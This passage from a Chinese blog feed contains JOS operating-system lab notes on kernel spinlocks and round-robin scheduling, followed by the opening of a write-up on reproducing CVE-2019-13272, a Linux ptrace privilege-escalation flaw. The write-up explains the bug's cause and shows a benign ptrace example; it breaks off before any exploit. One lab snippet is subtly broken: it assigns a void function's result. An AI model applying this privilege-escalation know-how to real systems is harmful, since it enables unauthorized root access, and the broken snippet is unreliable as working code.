here.</span><br>assert(curenv);<br>lock_kernel();<br><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_run</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// recover the context of process and ret2usr</span><br>    unlock_kernel();<br>lcr3(PADDR(curenv-&gt;env_pgdir));<br>env_pop_tf(&amp;curenv-&gt;env_tf);<br><br><span class="hljs-comment">// we never arrive there</span><br>panic(<span class="hljs-string">&quot;env_run not yet implemented&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是习题 time：为什么有了大内核锁我们还要为每个 CPU 分配一个独立的内核栈？</p><blockquote><p><strong>Question</strong></p><ol><li>It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock.</li></ol></blockquote><p>我们在从用户态陷入到内核态再到获取到锁中间仍有一段需要压栈的过程，因此若多个用户进程同时陷入内核态则会破坏掉内核栈上保存的属于其他用户进程的栈帧</p><p>之后是 Challenge，为四个地方加上锁：</p><blockquote><p><em>Challenge!</em> The big kernel lock is simple and easy to use. Nevertheless, it eliminates all concurrency in kernel mode. Most modern operating systems use different locks to protect different parts of their shared state, an approach called <em>fine-grained locking</em>. Fine-grained locking can increase performance significantly, but is more difficult to implement and error-prone. If you are brave enough, drop the big kernel lock and embrace concurrency in JOS!</p><p>It is up to you to decide the locking granularity (the amount of data that a lock protects). As a hint, you may consider using spin locks to ensure exclusive access to these shared components in the JOS kernel:</p><ul><li>The page allocator.</li><li>The console driver.</li><li>The scheduler.</li><li>The inter-process communication (IPC) state that you will implement in the part C.</li></ul></blockquote><p>第四个在 part C 才实现，我们先看前三个</p><p>首先是 page allocator，我们在这里声明一个全局的锁变量，在 <code>page_init()</code> 中对其初始化，并在 <code>page_alloc()</code> 与 <code>page_free()</code> 中都加入对该锁的使用，这里笔者选择为这两个函数再添加一层 wrapper 来使用锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// spinlock for page allocator</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">page_lock</span>;</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <br><span class="hljs-comment">// 6) init page_lock</span><br>__spin_initlock(&amp;page_lock, <span class="hljs-string">&quot;page allocator lock&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><br><span class="hljs-class">__<span class="hljs-title">page_alloc</span>(<span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">res</span>;</span><br><br>spin_lock(&amp;page_lock);<br>res = __page_alloc(alloc_flags);<br>spin_unlock(&amp;page_lock);<br><br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">void</span><br>__page_free(<span class="hljs-keyword">struct</span> PageInfo *pp)<br>&#123;<br>    <span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br>spin_lock(&amp;page_lock);<br>res = __page_free(pp);<br>spin_unlock(&amp;page_lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>console driver 其实也是同样的思路，不过笔者分为读和写两个锁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">read_lock</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">write_lock</span>;</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// initialize the console devices</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cons_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>cga_init();<br>kbd_init();<br>serial_init();<br><br>__spin_initlock(&amp;read_lock, <span class="hljs-string">&quot;console read lock&quot;</span>);<br>__spin_initlock(&amp;write_lock, <span class="hljs-string">&quot;console write lock&quot;</span>);<br><br><span class="hljs-keyword">if</span> (!serial_exists)<br>cprintf(<span class="hljs-string">&quot;Serial port does not exist!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cputchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>spin_lock(&amp;write_lock);<br>cons_putc(c);<br>spin_unlock(&amp;write_lock);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">getchar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> c;<br><br>spin_lock(&amp;read_lock);<br><br><span class="hljs-keyword">while</span> ((c = cons_getc()) == <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* do nothing */</span>;<br><br>spin_unlock(&amp;read_lock);<br><br><span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure><p><del>scheduler 现在还没有写呢，所以👴选择摸了</del></p><h3 id="Round-Robin-Scheduling"><a href="#Round-Robin-Scheduling" class="headerlink" title="Round-Robin Scheduling"></a>Round-Robin Scheduling</h3><blockquote><p>关于这个算法，笔者在<a href="https://arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/#%E5%85%B3%E4%BA%8E%E8%BD%AE%E8%AF%A2%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B">这篇博客</a>里写了他的来龙去脉</p></blockquote><p>接下来我们需要实现 <em>轮询调度算法</em> ：</p><ul><li><code>sched_yield()</code> 用以从遍历 <code>envs[]</code> 数组并选择第一个状态为 <code>ENV_RUNNABLE</code> 的进程去运行</li><li><code>sched_yield()</code> 不应当让一个进程被同时跑在两个 CPU 上</li><li>JOS 还实现了一个新的系统调用 <code>sys_yield()</code> 以让当前用户进程休眠，使当前 CPU 去运行另一个进程</li></ul><p>接下来是 Exercise 6 了，在 <code>sched_yield()</code>  中实现轮询调度算法：</p><blockquote><p><strong>Exercise 6.</strong> Implement round-robin scheduling in <code>sched_yield()</code> as described above. Don’t forget to modify <code>syscall()</code> to dispatch <code>sys_yield()</code>.</p><p>Make sure to invoke <code>sched_yield()</code> in <code>mp_main</code>.</p><p>Modify <code>kern/init.c</code> to create three (or more!) environments that all run the program <code>user/yield.c</code>.</p><p>Run make qemu. You should see the environments switch back and forth between each other five times before terminating, like below.</p><p>Test also with several CPUS: make qemu CPUS&#x3D;2.</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs erlang">...<br>Hello, I am environment <span class="hljs-number">00001000</span>.<br>Hello, I am environment <span class="hljs-number">00001001</span>.<br>Hello, I am environment <span class="hljs-number">00001002</span>.<br>Back in environment <span class="hljs-number">00001000</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001001</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001002</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001000</span>, iteration <span class="hljs-number">1</span>.<br>Back in environment <span class="hljs-number">00001001</span>, iteration <span class="hljs-number">1</span>.<br>Back in environment <span class="hljs-number">00001002</span>, iteration <span class="hljs-number">1</span>.<br>...<br></code></pre></td></tr></table></figure><p>After the <code>yield</code> programs exit, there will be no runnable environment in the system, the scheduler should invoke the JOS kernel monitor. If any of this does not happen, then fix your code before proceeding.</p></blockquote><p>前面的 Challenge 说到为 scheduler 加锁，因此笔者选择在 <code>kern/env.h</code> 中声明一个自旋锁，定义放在 <code>kern/env.c</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">sched_lock</span>;</span><span class="hljs-comment">// lock for Env in scheduler</span><br></code></pre></td></tr></table></figure><p>在 <code>env_init()</code> 中对其初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br><span class="hljs-comment">// initialize the scheduler lock</span><br>__spin_initlock(&amp;sched_lock, <span class="hljs-string">&quot;scheduler lock&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后就是实现 <code>sched_yield()</code> 了，这里为了保证公平因此我们应当从当前进程往后进行遍历而不是每次都从 env[0] 开始，需要注意的是若我们轮询一遍进程数组发现没有其他可运行进程的话需要返回到发起 yield 的进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Choose a user environment to run and run it.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">sched_yield</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><br><br><span class="hljs-comment">// Implement simple round-robin scheduling.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span><br><span class="hljs-comment">// circular fashion starting just after the env this CPU was</span><br><span class="hljs-comment">// last running.  Switch to the first such environment found.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If no envs are runnable, but the environment previously</span><br><span class="hljs-comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span><br><span class="hljs-comment">// choose that environment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Never choose an environment that&#x27;s currently running on</span><br><span class="hljs-comment">// another CPU (env_status == ENV_RUNNING). If there are</span><br><span class="hljs-comment">// no runnable environments, simply drop through to the code</span><br><span class="hljs-comment">// below to halt the cpu.</span><br><br><span class="hljs-comment">// LAB 4: Your code here.</span><br><span class="hljs-type">int</span> i, start_idx;<br><br>spin_lock(&amp;sched_lock);<br><br>idle = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (curenv)<br>start_idx = ENVX(curenv-&gt;env_id) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>start_idx = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// traversal envs</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NENV; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (envs[(start_idx + i) % NENV].env_status == ENV_RUNNABLE)<br>&#123;<br>idle = &amp;envs[(start_idx + i) % NENV];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// no other runnable, try to rerun curenv</span><br><span class="hljs-keyword">if</span> (!idle &amp;&amp; curenv <br>&amp;&amp; curenv-&gt;env_status == ENV_RUNNING<br>&amp;&amp; curenv-&gt;env_cpunum == cpunum())<br>idle = curenv;<br><br><span class="hljs-keyword">if</span> (idle)<br>&#123;<br>idle-&gt;env_status = ENV_RUNNING;<br>spin_unlock(&amp;sched_lock);<br>env_run(idle);<br>&#125;<br><br>spin_unlock(&amp;sched_lock);<br><span class="hljs-comment">// sched_halt never returns</span><br>sched_halt();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们的自旋锁还需要保护整个 env 数组，在 <code>env_alloc()</code> 与 <code>env_free()</code> 上套一层 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <br><span class="hljs-title function_">env_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env **newenv_store, <span class="hljs-type">envid_t</span> parent_id)</span><br>&#123;<br><span class="hljs-type">int</span> res;<br><br>spin_lock(&amp;sched_lock);<br>res = __env_alloc(newenv_store, parent_id);<br>spin_unlock(&amp;sched_lock);<br><br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br>spin_lock(&amp;sched_lock);<br>__env_free(e);<br>spin_unlock(&amp;sched_lock);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里笔者为了完成加锁的那个 Challenge，走了不少弯路…也掉了几次坑….</p></blockquote><p>别忘了在 <code>kern/syscall.c</code> 中补充上对 <code>sys_yield()</code> 的调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Dispatches to the correct kernel function, passing the arguments.</span><br><span class="hljs-type">int32_t</span><br><span class="hljs-title function_">syscall</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> syscallno, <span class="hljs-type">uint32_t</span> a1, <span class="hljs-type">uint32_t</span> a2, <span class="hljs-type">uint32_t</span> a3, <span class="hljs-type">uint32_t</span> a4, <span class="hljs-type">uint32_t</span> a5)</span><br>&#123;<br><span class="hljs-comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span><br><span class="hljs-comment">// Return any appropriate return value.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// panic(&quot;syscall not implemented&quot;);</span><br><br><span class="hljs-keyword">switch</span> (syscallno) &#123;<br><span class="hljs-keyword">case</span> SYS_cputs:<br>sys_cputs((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)a1, a2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SYS_cgetc:<br><span class="hljs-keyword">return</span> sys_cgetc();<br><span class="hljs-keyword">case</span> SYS_getenvid:<br><span class="hljs-keyword">return</span> sys_getenvid();<br><span class="hljs-keyword">case</span> SYS_env_destroy:<br><span class="hljs-keyword">return</span> sys_env_destroy(a1);<br><span class="hljs-keyword">case</span> SYS_yield:<br>sys_yield();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是习题 Time：</p><blockquote><p><strong>Question</strong></p><ol><li>In your implementation of <code>env_run()</code> you should have called <code>lcr3()</code>. Before and after the call to <code>lcr3()</code>, your code makes references (at least it should) to the variable <code>e</code>, the argument to <code>env_run</code>. Upon loading the <code>%cr3</code> register, the addressing context used by the MMU is instantly changed. But a virtual address (namely <code>e</code>) has meaning relative to a given address context–the address context specifies the physical address to which the virtual address maps. Why can the pointer <code>e</code> be dereferenced both before and after the addressing switch?</li><li>Whenever the kernel switches from one environment to another, it must ensure the old environment’s registers are saved so they can be restored properly later. Why? Where does this happen?</li></ol></blockquote><p>两个 Challenge，</p><blockquote><p><em>Challenge!</em> Add a less trivial scheduling policy to the kernel, such as a fixed-priority scheduler that allows each environment to be assigned a priority and ensures that higher-priority environments are always chosen in preference to lower-priority environments. If you’re feeling really adventurous, try implementing a Unix-style adjustable-priority scheduler or even a lottery or stride scheduler. (Look up “lottery scheduling” and “stride scheduling” in Google.)</p><p>Write a test program or two that verifies that your scheduling algorithm is working correctly (i.e., the right environments get run in the right order). It may be easier to write these test programs once you have implemented <code>fork()</code> and IPC in parts B and C of this lab.</p></blockquote><blockquote><p><em>Challenge!</em> The JOS kernel currently does not allow applications to use the x86 processor’s x87 floating-point unit (FPU), MMX instructions, or Streaming SIMD Extensions (SSE). Extend the <code>Env</code> structure to provide a save area for the processor’s floating point state, and extend the context switching code to save and restore this state properly when switching from one environment to another. The <code>FXSAVE</code> and <code>FXRSTOR</code> instructions may be useful, but note that these are not in the old i386 user’s manual because they were introduced in more recent processors. Write a user-level test program that does something cool with floating-point.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如 Windows XP 好用&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="操作系统" scheme="http://blog.arttnba3.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="实验笔记" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="XV6" scheme="http://blog.arttnba3.cn/tags/XV6/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/"/>
    <id>http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/</id>
    <published>2022-01-16T17:49:56.000Z</published>
    <updated>2022-01-16T17:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>你不许说他，他是你爹？</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2019-13272 是自 Linux v4.11 版本起引入的一个本地提权漏洞，由来自 Google Zero Project 安全团队的  Jann Horn （<del>很帅气的外国小哥</del>）于 2019 年 9 月发现，该漏洞的成因主要是 ptrace 系统调用中 <code>PTRACE_TRACEME</code> 参数调用路径上的 <code>ptrace_link()</code> 函数错误地处理了想要创建 ptrace 关系的进程间的凭据记录，从而导致攻击者可以通过 suid 程序实现本地提权</p><p>该漏洞影响版本从 <code>v4.11</code> 到 <code>v5.1.17</code>，不过<strong>只能在有着桌面环境的情况下完成提权</strong>，因为提权需要用到一个通常只在桌面环境下存在的 <em>helper程序</em> ，所以相对比较鸡肋</p><p>在分析该漏洞之前，我们先补充一些前置知识</p><blockquote><p>以下内核源码皆来自于 Linux v4.11</p></blockquote><h2 id="ptrace-系统调用"><a href="#ptrace-系统调用" class="headerlink" title="ptrace 系统调用"></a>ptrace 系统调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>ptrace 系统调用主要用于对进程进行调试：该系统调用提供了一种机制使得调试进程（ptracer）可以观察与控制被调试进程（ptracee）的执行过程，并修改被调试进程的寄存器及内存，从而操控被调试进程实现特定的行为</p><blockquote><p> 相信大家对这个系统调用应该都不陌生，gdb 调试便是利用了这个系统调用</p></blockquote><p>常见的建立 ptrace 连接有两种方法：</p><ul><li>子进程通过 <code>PTRACE_TRACEME</code> 请求父进程进行调试</li><li>父进程通过 <code>PTRACE_ATTACH</code> 主动对指定进程进行调试</li></ul><p>这个漏洞主要是出现在第一条路径中，因此我们下文主要针对第一条路径进行分析</p><p>一个典型的通过 ptrace 由父进程对子进程进行单步调试的例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> wait_val;</span><br><span class="line">    <span class="type">int</span> instructions = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (!child_pid) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Set the child as a ptracee.&quot;</span>);</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// let the parent ptrace it, won&#x27;t stop there but send a signal to parent</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done. Now waiting for the parent...&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;./helloworld&quot;</span>, <span class="string">&quot;helloworld&quot;</span>, <span class="literal">NULL</span>); <span class="comment">// the programme to be debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(&amp;wait_val); <span class="comment">// waiting for the signal from child</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent received signal, running...&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (wait_val == <span class="number">1407</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            instructions++;</span><br><span class="line">            <span class="keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">                perror(<span class="string">&quot;ptrace error!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            wait(&amp;wait_val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Done for %d instructions.\n&quot;</span>, instructions);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent quit.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/01/13/ZodQuBfgsrLCXlp.png" alt="image.png"></p><p>通常情况下，ptrace <strong>只能调试属于 ptracer 所属用户的进程</strong>，例如普通用户便不能调试 root 进程</p><h2 id="task-struct：进程描述符（process-descriptor）"><a href="#task-struct：进程描述符（process-descriptor）" class="headerlink" title="task_struct：进程描述符（process descriptor）"></a>task_struct：进程描述符（process descriptor）</h2><p>在 Linux 中一个进程便是一个 task，在 kernel 中使用一个 <code>task_struct</code> 